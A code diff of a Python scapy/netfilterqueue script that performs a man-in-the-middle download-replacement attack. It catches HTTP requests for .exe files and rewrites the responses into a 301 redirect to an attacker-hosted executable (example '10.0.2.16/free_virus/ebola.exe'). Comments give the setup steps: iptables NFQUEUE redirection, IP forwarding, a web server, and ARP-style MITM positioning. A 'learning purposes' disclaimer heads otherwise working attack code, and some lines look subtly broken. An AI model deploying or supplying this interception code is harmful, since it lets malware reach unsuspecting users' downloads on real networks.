@@ -1,11 +1,18 @@
 #!/usr/bin/env python
-
-# modifies data in http layer using scapy
+# This is a conceptual program fr learning purposes don't be evil with it
 
 import netfilterqueue
 import scapy.all as scapy
 
 ack_list = []
+
+def set_load(packet, my_load):
+    packet[scapy.Raw].load = my_load
+    # remove length and check-sum params to bypass checks
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
@@ -18,7 +25,7 @@ def process_packet(packet):
             # placeholder for running something when .exe is detected
             ack_list.append(scapy_packet[scapy.TCP.ack])
             # store the ack info from the TCP layer in the ack_list arr.
-            print(scapy_packet.show())
+            # print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
             print("HTTP response")
             if scapy_packet[scapy.TCP].seq in ack_list:
@@ -26,10 +33,23 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 # Make sure to remove the seq after identifying it so we clear out the arr.
                 print("Replacing target file....")
-                print(scapy_packet.show())
-                # run replacement program
+                # if a file gives problems, consider adding \n\n to clear any clutter right after that might interfere
+                # syntax for kali-machine web-root server dir, (from dir in var/www/html ....)
+                # proper syntax for custom download link through your web-root server: IP.a.d.rs/dir/file.exe
+                # example: 10.0.2.16/free_virus/ebola.exe
+                # need to have web-server active with  ==> service apache2 start
+                # need to reset ip tables with ==> iptables --flush
+                # then redirect data appropriately with iptables -I FORWARD -j NFQUEUE --queue-num 0
+                # run MITM tool / program to get between target and router
+                # new terminal to allow IP forwarding ==> echo 1 > /proc/sys/net/ipv4/ip_forward
+                # !!!! We put our desired resource as the second arg in the following line !!!
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https:/www.example-link.com/rar/filename.exe")
+                # modify our scapy_packet var with desired info then set it as the packet
+                packet.set_payload(str(modified_packet))
 
     packet.accept()
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
+
+#     TCP.ack field in request matches TCP.seq in answer
